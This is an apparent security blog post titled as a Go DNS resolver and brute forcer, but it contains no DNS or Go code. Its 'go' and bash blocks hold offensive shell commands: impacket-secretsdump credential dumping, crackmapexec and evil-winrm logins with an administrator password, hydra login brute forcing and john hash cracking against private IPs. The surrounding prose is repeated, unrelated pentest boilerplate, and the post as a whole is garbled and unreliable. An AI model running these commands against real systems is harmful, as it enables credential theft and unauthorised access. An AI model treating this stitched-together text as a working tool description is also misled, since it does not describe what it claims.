---
TitleSEO: "DNS Resolver and Brute Forcer in Go | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Go"
Author: "ZureFX"
Description: "A Go script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "automation, fuzzer, go"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-414.html"
URL_IMAGES: ""
Date: "2024-12-18"
Tags: "Automation, Fuzzer, Go"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-414"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-414.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `bloodhound`
- `ldapsearch`
- `kerbrute`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism.

```go
impacket-secretsdump administrator:'P@ssw0rd!'@10.58.148.98
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.76.8.8 -u administrator -p 'P@ssw0rd!' --shares
```

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

```go
evil-winrm -i 10.73.196.117 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.34.83.57 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.82.181.113
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 16.62s
```
